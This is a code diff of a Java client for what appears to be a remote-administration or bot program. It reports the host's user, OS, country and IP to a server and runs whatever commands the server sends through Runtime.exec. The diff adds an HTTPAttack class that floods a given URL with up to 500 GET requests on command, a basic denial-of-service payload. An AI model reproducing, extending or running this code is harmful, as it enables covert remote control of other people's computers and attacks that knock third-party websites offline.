@@ -1,9 +1,7 @@
 package br.com.pricher.server;
 
 import java.io.*;
-import java.net.InetAddress;
-import java.net.Socket;
-import java.net.URI;
+import java.net.*;
 
 /**
  * Created by Douglas Giovanella on 31/07/2017.
@@ -11,8 +9,6 @@ import java.net.URI;
 public class Client {
 
     private Socket socket;
-    private OutputStream ou;
-    private Writer ouw;
     private BufferedWriter bfw;
 
     public static void main(String[] args) throws IOException {
@@ -25,13 +21,13 @@ public class Client {
         do {
             try {
                 socket = new Socket("localhost", 8094);
-                ou = socket.getOutputStream();
+                OutputStream ou = socket.getOutputStream();
 
-                ouw = new OutputStreamWriter(ou);
+                Writer ouw = new OutputStreamWriter(ou);
                 bfw = new BufferedWriter(ouw);
 
             } catch (Exception e) {
-                System.err.println(e);
+                System.err.println(e.getMessage());
             }
 
         } while (socket == null);
@@ -49,7 +45,6 @@ public class Client {
 
 
         bfw.write("[" + osCountry + "]" + osUser + " - " + osName + " - [" + ipUser + "]\r\n+");
-        //enviarMensagem("Computer IP: " + ipAddress.getHostAddress() + " Connected");
         bfw.flush();
     }
 
@@ -80,41 +75,89 @@ public class Client {
             if (bfr.ready()) {
                 msg = bfr.readLine();
                 String[] msgFormatted = msg.split("&");
-
-                switch (Integer.parseInt(msgFormatted[0])) {
-                    case 0:
-                        Runtime.getRuntime().exec(msgFormatted[1]);
-                        sendMessage("Computador programado para desligar!");
-                        break;
-                    case 1:
-                        try {
+                try {
+                    switch (Integer.parseInt(msgFormatted[0])) {
+                        case 0:
+                            Runtime.getRuntime().exec(msgFormatted[1]);
+                            sendMessage("Computer programed to turn off!!!");
+                            break;
+                        case 1:
                             java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));
-                            sendMessage("Site " + msgFormatted[1] + " aberto!");
-                        } catch (Exception e) {
-                            e.printStackTrace();
-                            sendMessage(e.getMessage());
-                        }
-                        break;
-                    case 2:
-                        Runtime.getRuntime().exec(msgFormatted[1]);
-                        break;
-                    case 66:
-                        new HTTPAtack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();
-                        break;
-                    default:
-                        sendMessage("Erro ao enviar o comando.");
-                        break;
+                            sendMessage("Site " + msgFormatted[1] + " open!");
+                            break;
+                        case 2:
+                            Runtime.getRuntime().exec(msgFormatted[1]);
+                            sendMessage("Command executed!");
+                            break;
+                        case 66:
+                            new HTTPAttack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();
+                            break;
+                        default:
+                            sendMessage("Message code invalid!");
+                            break;
 
+                    }
+                } catch (Exception e) {
+                    sendMessage("Error to execute the command! " + e.getMessage());
                 }
             }
     }
+}
 
-    /*
-    private void exit() throws IOException {
-        sendMessage("Exit");
-        bfw.close();
-        ouw.close();
-        ou.close();
-        socket.close();
-    }*/
+class HTTPAttack extends Thread {
+
+
+    private static final int LOW = 1;
+    private static final int MEDIUM = 2;
+    private static final int HIGH = 3;
+
+    private static final int REQUEST_LOW = 100;
+    private static final int REQUEST_MEDIUM = 200;
+    private static final int REQUEST_HIGH = 500;
+
+    private URL url;
+    private int intensity;
+
+    HTTPAttack(String url, int intensity) {
+        try {
+            this.url = new URL(url);
+            this.intensity = intensity;
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+    }
+
+    private static int getNumRequest(int intensity) {
+        switch (intensity) {
+            case LOW:
+                return REQUEST_LOW;
+            case MEDIUM:
+                return REQUEST_MEDIUM;
+            default:
+                return REQUEST_HIGH;
+        }
+    }
+
+    public void run() {
+        int i = 0;
+        int request = getNumRequest(this.intensity);
+        while (i < request) {
+            try {
+                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();
+                conn.setAllowUserInteraction(true);
+                conn.setConnectTimeout(5000); // 15 sec. connection timeout
+                conn.setDoInput(true);
+                conn.setDoOutput(false);
+                conn.setUseCaches(false);
+                conn.setRequestMethod("GET");
+                conn.setRequestProperty("Content-type", "text/html; charset=" + "UTF-8");
+
+                conn.connect();
+                conn.getResponseCode();
+            } catch (Exception e) {
+                System.out.println(e.getMessage());
+            }
+            i++;
+        }
+    }
 }
